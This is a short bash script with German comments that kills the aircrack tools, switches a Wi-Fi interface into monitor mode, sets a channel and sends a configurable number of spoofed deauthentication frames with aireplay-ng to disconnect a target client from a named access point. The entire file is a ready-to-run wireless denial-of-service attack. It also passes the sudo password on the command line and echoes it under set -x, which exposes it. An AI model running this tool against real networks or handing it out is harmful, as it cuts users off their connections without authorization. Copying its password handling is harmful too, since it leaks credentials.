#!/bin/bash

set -x

INTERFACE="$1"       # WLAN-Interface, z.B. wlan0
AP_MAC="$2"          # BSSID des Access Points
CLIENT_MAC="$3"      # MAC-Adresse des Clients
DESIRED_CHANNEL="$4" # Kanal, auf dem gesendet werden soll
PACKETS="$5"         # Anzahl der Deauth-Pakete
SECRET="$6"          # sudo-Passwort

if [ -z "$INTERFACE" ] || [ -z "$AP_MAC" ] || [ -z "$CLIENT_MAC" ]; then
  echo "❌ Usage: $0 <interface> <ap_mac> <client_mac> <channel> [packets] <sudo-secret>"
  exit 1
fi

# Defaults
PACKETS=${PACKETS:-100}
DESIRED_CHANNEL=${DESIRED_CHANNEL:-6}

# kill airodump
echo $SECRET | sudo -S killall airodump-ng
echo $SECRET | sudo -S killall aircrack-ng
echo $SECRET | sudo -S killall airmon-ng

echo $SECRET | sudo -S airmon-ng check kill
echo $SECRET | sudo -S airmon-ng stop "$INTERFACE"

# Prüfe ob das Interface im Monitor-Modus ist
MODE=$(iwconfig "$INTERFACE" 2>/dev/null | grep -o 'Mode:[^ ]*' | cut -d: -f2)
if [ "$MODE" != "Monitor" ]; then
  echo "[i] Setze $INTERFACE in den Monitor-Modus..."
  echo $SECRET | sudo -S ip link set "$INTERFACE" down
  echo $SECRET | sudo -S iw dev "$INTERFACE" set type monitor
  echo $SECRET | sudo -S ip link set "$INTERFACE" up
  echo $SECRET | sudo -S iw dev "$INTERFACE" set power_save off
fi

# Detect current channel
CURRENT_CHANNEL=$(iw dev "$INTERFACE" info 2>/dev/null | awk '/channel/ {print $2; exit}')
if [ -z "$CURRENT_CHANNEL" ]; then
  echo "⚠️  Could not detect current channel. Using desired $DESIRED_CHANNEL"
  CURRENT_CHANNEL="$DESIRED_CHANNEL"
fi
echo "🔍 Current channel: $CURRENT_CHANNEL"
echo "🎯 Desired channel: $DESIRED_CHANNEL"

# Switch channel if needed
if [ "$CURRENT_CHANNEL" -ne "$DESIRED_CHANNEL" ]; then
  echo "[i] Setting channel $DESIRED_CHANNEL on $INTERFACE"
  echo $SECRET | sudo -S iwconfig $INTERFACE channel $DESIRED_CHANNEL
  sleep 1
else
  echo "✅ Channel is already $DESIRED_CHANNEL"
fi

# Send deauth frames to the client, spoofing AP
echo "🚀 Sending $PACKETS deauth packets to client $CLIENT_MAC (via AP $AP_MAC) on $INTERFACE"
echo $SECRET | sudo -S aireplay-ng --deauth $PACKETS -a $AP_MAC -c $CLIENT_MAC $INTERFACE
